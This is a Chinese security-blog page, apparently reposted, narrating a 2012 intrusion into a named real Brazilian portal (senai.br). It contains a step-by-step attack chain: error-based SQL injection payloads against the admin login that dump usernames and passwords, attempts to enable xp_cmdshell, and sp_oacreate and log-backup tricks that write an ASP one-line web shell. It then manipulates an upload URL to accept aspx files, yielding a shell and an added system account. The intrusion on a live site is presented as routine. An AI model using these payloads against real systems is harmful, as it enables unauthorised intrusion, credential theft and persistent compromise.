<!DOCTYPE html>
<html>

<head>
  <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
  <title>入侵巴西最大门户网站 | Blog of Secer</title>
  <meta name="description" content="" />
  <meta name="HandheldFriendly" content="True" />
  <meta name="MobileOptimized" content="320" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <link rel="stylesheet" type="text/css" href="/css/screen.css" />
  <link rel="stylesheet" type="text/css" href="/css/style.css" />
  <meta name="generator" content="Blog of Secer">

  
  
  

  
</head>

<!--
<body class="post-template">
-->
<body class="home-template">
<div id="perspective" class="perspective effect-movedown">
  <div class="container">
    <!-- wrapper -->
    <div class="wrapper">

      <header class="site-head"  style="background: #24282b url(/img/img-bg.jpg) 0 -20%" >
    <div class="vertical">
        <div class="site-head-content inner">
             <a class="blog-logo" href="/"><img src="/img/logo.svg" alt="Blog Logo"/></a> 
            <h1 class="blog-title">Blog of Secer</h1>
            <h2 class="blog-description"><button id="showMenu">Show Menu</button></h2>
        </div>
    </div>
</header>

      

<main class="content" role="main">
  <article class="post">
    <span class="post-meta">
      <time datetime="2012-06-23T08:12:10.000Z" itemprop="datePublished">
          2012-06-23
      </time>
    
    
    | 
    <a href='/tag/SQLServer/'>SQLServer</a>,
    
    <a href='/tag/Sa/'>Sa</a>,
    
    <a href='/tag/拿Webshell/'>拿Webshell</a>,
    
    <a href='/tag/提权/'>提权</a>
    
    
</span>
    <h1 class="post-title">入侵巴西最大门户网站</h1>
    <section class="post-content">
      <p>标题:入侵巴西最大门户网站</p>  <p>作者:hackdn</p>  <p>转载注明</p>  <p>大家新年好，过年了，2012你的船票买好了么？</p>  <p>今天是除夕，貌似农历没大年三十</p>  <p>下午上网没事儿做，朋友甩来一网站，让我顺便帮帮安检了下，他让发下过程，就随便写写，有点乱，</p>  <p>主要是后台拿SHELL费劲了半天，高手直接飞过吧。。</p>  <p>巴西最大门户网站<a href="http://www.senai.br/" target="_blank" rel="external">www.senai.br</a>（塞纳工业 - -！）</p>  <p>GG搜了下，出来的点肯定都是不能直接注入的，该过滤的都过滤掉了~</p>  <p>工具扫了下，IIS 6的组建，幸好找到了后台路径</p>  <p><a href="http://www.senai.br/admin/login.aspx" target="_blank" rel="external">http://www.senai.br/admin/login.aspx</a>    <br>弱口令试了遍，进不去，’or’’=’ 没反应’or’=’or’直接报错，幸亏没禁MAGIC.</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image001" border="0" alt="clip_image001" src="http://img.cker.in/795a2ecf8a47_1F1/clip_image001.jpg" width="858" height="671"></p>  <p></p><a id="more"></a><p>看返回的组建信息，权限应该是SYS的错不了</p>  <p>好吧，试试可否执行语句</p>  <p>直接登陆框’and ( select @ @ version )=1–如图</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image002" border="0" alt="clip_image002" src="http://img.cker.in/795a2ecf8a47_1F1/clip_image002.jpg" width="832" height="325"></p>  <p>哎，到这里大家该散的就散了，下面都是一般的步骤</p>  <p>‘/<strong>/and/</strong>/user=1–</p>  <p>SQL用户是senai_web</p>  <p>‘/<strong>/and/</strong>/(select/<strong>/db_name())=1–</strong></p>  <p>database:SENAI_WEB</p>  <p>直接爆吧   <br>‘//and/<strong>/</strong></p>  <p>(select//top/<strong>/1/</strong>/name/<strong>/from/</strong>/senai_web.dbo.sysobjects/<strong>/where/</strong>/xtype=’U’)=1–</p>  <p>Material_Equipamento_Produto</p>  <p>应该不是这表，加进去   <br>‘/<strong>/and/</strong>/</p>  <p>(select/<strong>/top/</strong>/1/<strong>/name/</strong>/from/<strong>/senai_web.dbo.sysobjects/</strong>/where/<strong>/xtype=’U’/</strong>/an</p>  <p>d/<strong>/name/</strong>/not/<strong>/in/</strong>/(‘Material_Equipamento_Produto’,’Materia’))=1–</p>  <p>之后爆到Materia就不动了。 - -</p>  <p>OK，直接：   <br>‘/<strong>/and/</strong>/(select/<strong>/top/</strong>/1/<strong>/col_name(object_id(‘Materia’),1)/</strong>/from Materia)=1–    <br>还是Materia</p>  <p>考虑，这样子效率太低了，用HAVING试试   <br>‘/<strong>/having/</strong>/1=1–&#160;&#160;&#160;&#160; 直接出来了表结果’Usuarios.usuCodigo’</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image003" border="0" alt="clip_image003" src="http://img.cker.in/795a2ecf8a47_1F1/clip_image003.jpg" width="636" height="170"></p>  <p>实在是不懂巴西文~</p>  <p>谷歌翻译了下Usuarios意识是用户名</p>  <p>admin不出来Usuarios就应该是对的了</p>  <p>‘/<strong>/and/</strong>/(select/<strong>/top/</strong>/1/<strong>/col_name(object_id(‘Usuarios’),1)/</strong>/from Usuarios)=1–</p>  <p>出来usuCodigo，试了好久不是用户名的列。第二个是usuSenha，这个肯定是密码的。</p>  <p>第四个ID才是usuLogin的用户名。好了</p>  <p>‘/<strong>/and/</strong>/(select/<strong>/top/</strong>/1/<strong>/usuLogin++usuSenha/</strong>/from/**/Usuarios)=1–</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image004" border="0" alt="clip_image004" src="http://img.cker.in/795a2ecf8a47_1F1/clip_image004.jpg" width="819" height="245"></p>  <p>click agclick</p>  <p>出来的账户密码直接后台登进去了</p>  <p>进去傻眼了，都是鸟文 如图。装了几个翻译插件都用不了。。。。</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image005" border="0" alt="clip_image005" src="http://img.cker.in/795a2ecf8a47_1F1/clip_image005.jpg" width="671" height="539"></p>  <p>好吧，退出来，希望登陆界面的MSSQL权限是SA<del>~~就直接ADD CMD_SHELL组建吧</del></p>  <p>Use master dbcc addextendedproc(‘xp_cmdshell’,’xplog70.dll’)</p>  <p>返回必须SYS权限，郁闷</p>  <p>试试sp_oacreate：</p>  <p>‘ Declare @s int;exec sp_oacreate ‘wscript.shell’,@s out;Exec SP_OAMethod</p>  <p>@s,’run’,NULL,’cmd.exe /c echo ^&lt;%execute(request(char(35)))%</p>  <p>^&gt;&gt;C:\Inetpub\wwwroot\ProjetoSenai2\Componentes_Codigos_fontes\Admin\1.txt’;</p>  <p>路径为返回爆出的路径</p>  <p>可惜没权限。。。。sp_makewebtask也不行</p>  <p>好吧，寄权限与DB权限咯，不能差异备份就邪门了~！！！</p>  <p>‘ create table <a href="[cmd] [image]">hackdn_cmd</a>;declare @a sysname,@s nvarchar(4000)select</p>  <p>@a=db_name(),@s=0x62696E backup log @a to into <a href="cmd">hackdn_cmd</a>values(‘&lt;%</p>  <p>execute(request(chr(35)))%&gt;’);declare @b sysname,@t nvarchar(4000)select @b=db_name</p>  <p>(),@t=’D:\Dados\datainet\www\ENSI\SENAI\Site Senai\Web\1.txt’ backup log @b to with</p>  <p>init,no_truncate;drop table [hackdn_cmd];</p>  <p>再访问，也不行。。。</p>  <p>苦逼了很久才找到上传点</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image006" border="0" alt="clip_image006" src="http://img.cker.in/795a2ecf8a47_1F1/clip_image006.jpg" width="478" height="388"></p>  <p>可惜过滤了后缀呀。。。上传asp;jpg也自动修改为随机MD5的JPG了</p>  <p>好吧，瞎转悠后，发现了这个上传点的路径为：</p>  <p><a href="http://www.senai.br/admin/bibliotecaArquivos/upload.aspx" target="_blank" rel="external">http://www.senai.br/admin/bibliotecaArquivos/upload.aspx</a>?</p>  <p>publicacoes_Action=Upload&amp;tipoArquivo=doc,pdf&amp;localSave=../../upload/publicacoes/&amp;field=pub</p>  <p>licacoes_arquivo&amp;fieldSimples=arquivo&amp;tipoArquivoField=publicacoes_TipoDoArquivo&amp;tamanhoArq</p>  <p>uivoField=publicacoes_tamanhoDoArquivo</p>  <p>看到了上传的文件目录，希望它是单文件没过滤哈<del></del></p>  <p>抱着试试看的心态修改下上传目录：</p>  <p><a href="http://www.senai.br/admin/bibliotecaArquivos/upload.aspx" target="_blank" rel="external">http://www.senai.br/admin/bibliotecaArquivos/upload.aspx</a>?</p>  <p>publicacoes_Action=Upload&amp;tipoArquivo=doc,pdf&amp;localSave=../../upload/1.asp/&amp;field=publicaco</p>  <p>es_arquivo&amp;fieldSimples=arquivo&amp;tipoArquivoField=publicacoes_TipoDoArquivo&amp;tamanhoArquivoFi</p>  <p>eld=publicacoes_tamanhoDoArquivo</p>  <p>上传成功！！！直接返回了路径呀~如图：</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image007" border="0" alt="clip_image007" src="http://img.cker.in/795a2ecf8a47_1F1/clip_image007.jpg" width="619" height="259"></p>  <p>可惜打不开，而且图中的返回信息也说得是Could not find a part of the path。找不到路径啊   <br>估计肯定是没建立目录了。。。</p>  <p>仔细看了看URL，尼玛直接把tipoArquivo输入值作为最后判定的FILE赋值的后缀 - -！</p>  <p>好吧，直接修改成aspx的判定后缀试试~   <br><a href="http://www.senai.br/admin/bibliotecaArquivos/upload.aspx?publicacoes_Action=Upload&amp;tipoArquivo=aspx&amp;localSave=../../upload/publicacoes/&amp;field=publicacoes_arquivo&amp;fieldSimples=arquivo&amp;tipoArquivoField=publicacoes_TipoDoArquivo&amp;tamanhoArquivoField=publicacoes_tamanhoDoArquivo" target="_blank" rel="external">http://www.senai.br/admin/bibliotecaArquivos/upload.aspx?publicacoes_Action=Upload&amp;tipoArquivo=aspx&amp;localSave=../../upload/publicacoes/&amp;field=publicacoes_arquivo&amp;fieldSimples=arquivo&amp;tipoArquivoField=publicacoes_TipoDoArquivo&amp;tamanhoArquivoField=publicacoes_tamanhoDoArquivo</a></p>  <p>上传后右键源码直接看到了地址！！</p>  <p>OK，SHELL就直接拿到手了，在线CMD可以直接加SYS账户</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image008" border="0" alt="clip_image008" src="http://img.cker.in/795a2ecf8a47_1F1/clip_image008.jpg" width="486" height="224"></p>  <p>就这样了，详细也够啰嗦了。。。等着一会儿看春晚咯~</p>  <p>祝大家龙年事业顺利，顺心如意，家庭和睦，快快乐乐发大财！！！</p>  <p>常规的<a href="http://ha.cker.in/tag/SQLServer" target="_blank">SQLServer</a>+ASP.NET注入Sa权限<a href="http://ha.cker.in/tag/拿Webshell" target="_blank">拿Webshell</a>简单<a href="http://ha.cker.in/tag/提权" target="_blank">提权</a>。</p>
    </section>
    <footer class="post-footer">
      <section class="author">
    <h4>Secer</h4>
    <p>记录互联网安全历程与个人成长经历</p>
</section>
      <section class="share">
    <h4>Share this post</h4>
    <a class="icon-sina-weibo" href="http://v.t.sina.com.cn/share/share.php?title=记录互联网安全历程与个人成长经历 ?url=http://id.cker.in/600.seo/" target="_blank">
        <span class="hidden">weibo</span>
    </a>
    <a class="icon-twitter" href="http://twitter.com/share?url=http://id.cker.in/600.seo/"
       onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
        <span class="hidden">Twitter</span>
    </a>
    <a class="icon-facebook" href="https://www.facebook.com/sharer/sharer.php?u=http://id.cker.in/600.seo/"
       onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
        <span class="hidden">Facebook</span>
    </a>
    <a class="icon-google-plus" href="https://plus.google.com/share?url=http://id.cker.in/600.seo/"
       onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;">
        <span class="hidden">Google+</span>
    </a>
</section>

    </footer>
  </article>
  <nav class="pagination" role="pagination">
    
    <a class="newer-posts" href="/603.seo/">
        ← xss的发现与利用
    </a>
    
    <span class="icon-logo">•</span>
    
    <a class="older-posts" href="/596.seo/">
        Microsoft RDP Vulnerability Exploit (CVE-2012-0002 ) 微软MS12-020漏洞视频演示 →
    </a>
    
</nav>

  <div id="comment" class="comments-area">
    <h4 class="title"><a href="#disqus_comments" name="disqus_comments">Comments</a></h4>
    
</div>

</main>


      
<footer class="site-footer">
  
  <div class="inner">
     <section class="copyright">All content copyright <a href="/">Blog of Secer</a> &copy; 2014 &bull; All rights reserved.</section>
     <section class="poweredby">Proudly published with <a class="icon-ghost" href="http://zespia.tw/hexo/">Hexo</a></section>
  </div>
</footer>

      <script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>

<script type="text/javascript" src="/js/jquery.fitvids.js"></script>
<script type="text/javascript" src="/js/index.js"></script>
<script type="text/javascript" src="/js/menu.js"></script>





  </div>
</div>

<nav  class="outer-nav top horizontal">

          <a class="icon-home"  href="/"><span>Home</span></a>

          <a class="icon-news"  href="/archive"><span>Archive</span></a>

          <a class="icon-image"  href="/images"><span>Images</span></a>

          <a class="icon-wiki"  href="/wiki/2014-10-28-wiki/"><span>Wiki</span></a>

          <a class="icon-Favorites"  href="/favorites"><span>Favorites</span></a>

          <a class="icon-mail"  href="/about/2014-09-11-mabao/"><span>Contact</span></a>

</nav>

</div>
</body>
</html>
